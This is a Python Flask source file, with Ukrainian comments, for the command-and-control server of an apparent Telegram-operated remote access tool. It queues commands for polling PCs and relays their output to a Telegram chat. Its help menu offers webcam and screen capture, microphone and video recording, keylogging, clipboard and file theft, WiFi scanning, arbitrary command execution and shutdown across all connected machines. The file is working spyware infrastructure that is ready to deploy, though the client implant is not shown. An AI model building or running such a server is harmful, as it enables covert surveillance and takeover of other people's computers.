from flask import Flask, request, jsonify
import requests
import os
from collections import defaultdict
from datetime import datetime

app = Flask(__name__)

# ============================================================
#  НАЛАШТУВАННЯ — заповни перед деплоєм
# ============================================================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN")
CHAT_ID   = os.environ.get("CHAT_ID",   "YOUR_CHAT_ID")
# ============================================================

BASE_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

# Черга команд для кожного ПК: { "home": [...], "work": [...] }
queues = defaultdict(list)

# Онлайн ПК: { "home": "2024-01-01 12:00:00" }
online_pcs = {}


def send_message(text: str, parse_mode="Markdown") -> None:
    requests.post(f"{BASE_URL}/sendMessage", json={
        "chat_id": CHAT_ID,
        "text": text,
        "parse_mode": parse_mode,
    }, timeout=10)


def send_photo(image_bytes: bytes, caption: str = "") -> None:
    requests.post(f"{BASE_URL}/sendPhoto", data={
        "chat_id": CHAT_ID, "caption": caption
    }, files={"photo": ("photo.jpg", image_bytes, "image/jpeg")}, timeout=15)


HELP_TEXT = """
*Bot PC Remote*
One bot - all PCs!

*Format:*
`/command pcname` - run on specific PC
`/command all` - run on ALL PCs

*Commands:*
/screenshot - screen capture
/webcam - webcam photo
/audio - record mic (default 5s)
/video - record webcam (default 5s)
/keylog - record keypresses (default 30s)
/clipboard - get clipboard content
/activewindow - active window title
/processes - all processes
/ls - list files
/download - download file to TG
/delete - delete file
/ip - local + public IP
/wifi - nearby WiFi networks
/netstat - active connections
/sysinfo - CPU, RAM, disk
/kill - kill process
/startup - startup programs
/installed - installed apps
/volume\\_up /volume\\_down /mute
/run - run terminal command
/open - open website
/lock /sleep /restart /shutdown
/pcs - online PCs
/stop - stop script
/help - this menu

*Examples:*
`/screenshot home`
`/audio home 10`
`/video home 15`
`/keylog home 30`
`/download home C:\\file.txt`
`/kill home chrome.exe`
"""


def parse_command(text: str):
    """Розбирає /command target args"""
    parts = text.strip().split()
    if len(parts) < 2:
        return None
    cmd = parts[0].lower().split("@")[0]
    target = parts[1].lower()
    args = " ".join(parts[2:])
    return cmd, target, args


@app.route("/webhook", methods=["POST"])
def webhook():
    data = request.json
    msg = data.get("message") or data.get("edited_message")
    if not msg:
        return "ok"

    # Перевірка що повідомлення від власника
    if str(msg["chat"]["id"]) != str(CHAT_ID):
        return "ok"

    text = msg.get("text", "").strip()
    if not text.startswith("/"):
        return "ok"

    cmd_only = text.split()[0].lower()

    # Команди без таргету
    if cmd_only in ("/start", "/help"):
        send_message(HELP_TEXT)
        return "ok"

    if cmd_only == "/pcs":
        if not online_pcs:
            send_message("No PCs online")
        else:
            now = datetime.now()
            lines = ["*Online PCs:*"]
            for pc, last_seen in online_pcs.items():
                lines.append(f"  🟢 `{pc}` — last seen {last_seen}")
            send_message("\n".join(lines))
        return "ok"

    parsed = parse_command(text)
    if parsed is None:
        send_message("Wrong format!\nExample: `/screenshot home`")
        return "ok"

    cmd, target, args = parsed

    if target == "all":
        # Розіслати всім онлайн ПК
        if not online_pcs:
            send_message("No PCs online!")
        else:
            for pc in online_pcs:
                queues[pc].append({"cmd": cmd, "args": args})
            send_message(f"Sent to all: `{cmd}`")
    else:
        # Конкретний ПК
        queues[target].append({"cmd": cmd, "args": args})
        send_message(f"Sent to `{target}`: `{cmd}`")

    return "ok"


@app.route("/poll/<pc_name>", methods=["GET"])
def poll(pc_name):
    """ПК питає: є команди для мене?"""
    online_pcs[pc_name] = datetime.now().strftime("%H:%M:%S")

    if queues[pc_name]:
        task = queues[pc_name].pop(0)
        return jsonify({"task": task})
    return jsonify({"task": None})


@app.route("/result", methods=["POST"])
def result():
    """ПК надсилає текстовий результат назад на сервер → в Telegram"""
    data = request.json
    text = data.get("text", "")
    if text:
        send_message(text)
    return "ok"


@app.route("/photo", methods=["POST"])
def photo():
    """ПК надсилає фото"""
    caption = request.form.get("caption", "")
    file = request.files.get("photo")
    if file:
        send_photo(file.read(), caption)
    return "ok"


@app.route("/", methods=["GET"])
def index():
    return "Server is running!"


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
